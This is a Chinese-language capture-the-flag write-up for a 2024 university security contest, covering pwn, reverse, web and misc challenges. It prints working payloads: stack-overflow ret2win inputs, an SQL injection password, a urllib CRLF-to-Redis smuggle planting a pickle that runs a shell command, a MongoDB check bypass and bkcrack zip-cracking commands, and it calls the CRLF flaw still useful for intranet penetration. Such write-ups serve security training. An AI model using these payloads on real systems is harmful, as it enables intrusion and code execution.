---
title: 高校网络安全管理运维赛 Writeup
contest: 高校网络安全管理运维赛
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [buffer-overflow, ret2win, upx-unpack, bitwise-solve, jwt-bypass, mongodb-nosql, python-CRLF, redis-CRLF, pickle-exec, XXE-OOB, DKIM-verify, DNS-TXT]
attack_chain:
- babypwn: token+username+password 0x38字节溢出+p64(0x40117A) ret2win
- Login: token+admin/1q2w3e4r后Core dumped回显写入ELF,第二次token+admin+\x00*0x98+p64(0x40127E)改ret
- babyre: upx -d脱壳,4部分bitwise表达式爆破(a1+...==target)得4个数字
- pyssrf: Python 3.7 urllib CVE-2019-9740/CVE-2019-9947 CRLF注入+redis SSRF写pickle exec
- fileit: XXE无回显+VPS+xxe.php/xxe.xml外带
- phpsql: admin'||1万能密码SQL注入
- Messy Mongo: jwt登录ctfer+MongoDB updateOne $set+assert.notEqual('admin')+$toLower绕过
- zip: 5字符开头flag{+token+0x7f\x7f\x7f\x7f\x7f删除前缀构payload
- 钓鱼邮件: DKIM TXT记录查询+SPF/DMARC拼接+base64+ROT13综合
- easyshell: bkcrack已知明文攻击+修改压缩包密码
key_payload: admin'||1 + CVE-2019-9740 CRLF redis SET pickle exec
one_liner: 高校网络安全管理运维赛WP集合,涵盖PWN栈溢出+RE bitwise爆破+WEB JWT/MongoDB/Pickle/SSRF/XXE+MISC ZIP钓鱼邮件DKIM综合,运维安全方向。
lesson: 高校运维赛常见考点组合:Python 3.7+urllib CRLF CVE是稳定SSRF向量,MongoDB updateOne+$toLower能绕过assert.notEqual,DKIM/DMARC/SPF DNS记录枚举是钓鱼邮件分析标配。
quality: high
---

## 题目列表

PWN(2): babypwn / Login
RE(2): babyre / easyre
WEB(5): pyssrf / fileit / phpsql / Messy Mongo
MISC(4): zip / 签到 / 钓鱼邮件 / easyshell

## 关键考点

### babypwn: 栈溢出ret2win
- token+username=root+password=`a"*0x38 + p64(0x40117A)`
- flag{KooD1EijiemeePH8ieNei2XoL8iCh5de}

### Login: Core dumped回显ELF
- admin/1q2w3e4r登录后服务端crash输出二进制ELF
- 写文件后用IDA分析
- 第二次:`\x00*0x98 + p64(0x40127E)`改返回地址
- flag{loGiN_SuccESs_COngRatUlatIOn}

### babyre: 4部分bitwise表达式爆破
- upx -d babyre脱壳
- part1:加法得3821413212
- part2:`(a1 + (a1|0x8E03BEC3) - 3*(a1&0x71FC413C))==0x902C7FF8`爆破得98124621
- part3:4个bitwise操作得78769651
- part4:Python爆不出来改C爆,8个bitwise得67321987

### pyssrf: Python 3.7+urllib CVE-2019-9740/9947
- redis=Redis(host='127.0.0.1', port=6379) + get_result(url) + pickle反序列化
- CVE-2019-9740/9947:Python 3.7 urllib CRLF注入`%0d%0a`走私HTTP请求
- payload:`127.0.0.1:6379?\r\nSET e3a0c1ff... <pickle>\r\nquit`
- pickle: `class cmd(): def __reduce__(self): return (exec,("raise Exception(__import__('os').popen('cat /flag').read())",))`

### Messy Mongo: updateOne+$toLower
- jwt登录ctfer拿到token
- updateOne({username:user}, [{$set: delta}])管道语法
- assert.notEqual(newname, 'admin') - 大小写不敏感
- 第一步:patch username=Admin(大写,绕assert)
- 第二步:patch `{"username":{"$toLower":"$username"}}` - 聚合管道更新

### zip: 0x7f删除前缀
- 服务端检查input是否以flag{开头(只看5字符)
- 构造:`flag{` + `\x7f\x7f\x7f\x7f\x7f` + token
- 0x7f是ASCII DEL控制符,删除前一个字符
- flag{N3v3r-90Nn4-91v3-Y0u-uP}

### 钓鱼邮件: DKIM+SPF+DMARC
- ZmxhZ3tXZUxDb21lVG99 base64 → flag{WeLComeTo}
- dig txt +short default._domainkey.foobar-edu-cn.com → flag_part2=_Kn0wH0wt0_
- dig txt +short spf.foobar-edu-cn.com → flag_part1={N0wY0u
- dig txt +short _dmarc.foobar-edu-cn.com → flag_part3=ANAlys1sDNS}
- 拼接:flag{N0wY0u_Kn0wH0wt0_ANAlys1sDNS}

### easyshell: bkcrack已知明文攻击
- 已知secret2.txt内容,plaintext attack
- `bkcrack -C flag.zip -c secret2.txt -P secret2.zip -p secret2.txt`得key
- `bkcrack -C flag.zip -k <key> -U out.zip 123456`修改密码为123456

## 实战价值
- Python 3.7 CRLF注入CVE-2019-9740/9947在2024-2025内网渗透仍有效
- MongoDB updateOne+管道+$toLower绕过字符串相等检查是新的攻击向量
- DKIM/SPF/DMARC DNS记录枚举是邮件安全分析标配
- 0x7f DEL控制符绕过前缀检查是MISC常用技巧
